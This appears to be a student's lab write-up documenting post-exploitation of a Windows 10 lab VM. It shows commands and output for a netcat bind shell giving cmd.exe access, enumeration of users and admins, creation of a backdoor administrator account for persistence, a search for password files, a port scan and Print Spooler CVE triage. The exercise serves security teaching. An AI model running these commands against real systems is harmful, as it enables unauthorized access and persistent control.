_made in Obsidian.md_

If you have a Markdown reader, I strongly suggest you use it to view this for vastly increased readibility. Enjoy! :)

### 1.
I established a Netcat reverse shell connection to the target Windows system using the following steps:
- On the Windows target, executed: `ncat -l -p 8080 -e cmd.exe`
- On my Kali Linux attack machine, connected with: `nc 10.10.0.5 8080`

After connection, I verified my current user context:
```
C:\Windows\system32>whoami
whoami
windev2004eval\user
```

### 2. 
I listed all user accounts on the system:
```
C:\Windows\system32>net users
net users
User accounts for \\WINDEV2004EVAL
-------------------------------------------------------------------------------
Administrator DefaultAccount Guest
sshd User WDAGUtilityAccount
The command completed successfully.
```

### 3. 
I enumerated members of the local administrators group:
```
C:\Windows\system32>net localgroup administrators
net localgroup administrators
Alias name administrators
Comment Administrators have complete and unrestricted access to the
computer/domain
Members
-------------------------------------------------------------------------------
Administrator
User
The command completed successfully.
```

### 4.
I created a new user account for persistent access:
```
C:\Windows\system32>net user /add Alice pass
net user /add Alice pass
The command completed successfully.
```

### 5.
I added the new account to the administrators group:
```
C:\Windows\system32>net localgroup administrators "Alice" /add
net localgroup administrators "Alice" /add
The command completed successfully.
```

### 6.
I confirmed the backdoor account now has administrative privileges:
```
C:\Windows\system32>net localgroup Administrators
net localgroup Administrators
Alias name Administrators
Comment Administrators have complete and unrestricted access to the
computer/domain
Members
-------------------------------------------------------------------------------
Administrator
Alice
User
The command completed successfully.
```

### 7.
I verified SSH access using the newly created administrative account:
```
ssh Alice@10.10.0.5
```

The connection was successful, and I verified I was running with the Alice user context by running `whoami`.
![[Pasted image 20250421232541.png]]

## Slide 42

I searched for password files using PowerShell:
```
PS C:\Windows\system32> Get-ChildItem -Path C:\Users -Recurse | Where-Object {
$_.Name -like '*password*' }
Get-ChildItem -Path C:\Users -Recurse | Where-Object { $_.Name -like '*password*' }
Directory: C:\Users\User\temp
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 4/20/2024 1:12 PM 32 NYUpassword.txt
```

## Slide 46

I performed a port scan of the target system to identify open services:
```
PS C:\Windows\system32> 20..25 | ForEach-Object {$port = $_; Test-NetConnection
-ComputerName 10.10.0.5 -Port $port -InformationLevel Quiet -ErrorAction
SilentlyContinue}
20..25 | ForEach-Object {$port = $_; Test-NetConnection -ComputerName 10.10.0.5 -Port $port
-InformationLevel Quiet -ErrorAction SilentlyContinue}
WARNING: TCP connect to (10.10.0.5 : 20) failed
False
WARNING: TCP connect to (10.10.0.5 : 21) failed
False
True
WARNING: TCP connect to (10.10.0.5 : 23) failed
False
WARNING: TCP connect to (10.10.0.5 : 24) failed
False
WARNING: TCP connect to (10.10.0.5 : 25) failed
False
```

The results show that only port 22 (SSH) is open on the target system.

## Slide 79

First, I gathered system information to identify the Windows version:
```
PS C:\Windows\system32> systeminfo
systeminfo
Host Name: WINDEV2004EVAL
OS Name: Microsoft Windows 10 Enterprise Evaluation
OS Version: 10.0.18363 N/A Build 18363
```

Based on the build number, I determined this is Windows 10 Version 1909.

### Vulnerability Analysis
After researching on CVEdetails.com, I found:
1. **False Positive Example**: CVE-2022-26828 - Windows Bluetooth driver elevation of privilege vulnerability
   - Checked Device Manager and confirmed no Bluetooth drivers were installed
   - ![[Pasted image 20250421233415.png]]
   
2. **True Positive Example**: CVE-2022-21999 - Windows Print Spooler Elevation of Privilege Vulnerability
   - Confirmed Print Spooler service is running on the system
   - ![[Pasted image 20250421233504.png]]
   - This true positive should be ranked as high priority as this is included in the CISA Known Exploited Vulnerabilities Catalog. It can be used to gain dangerous privilege escalations
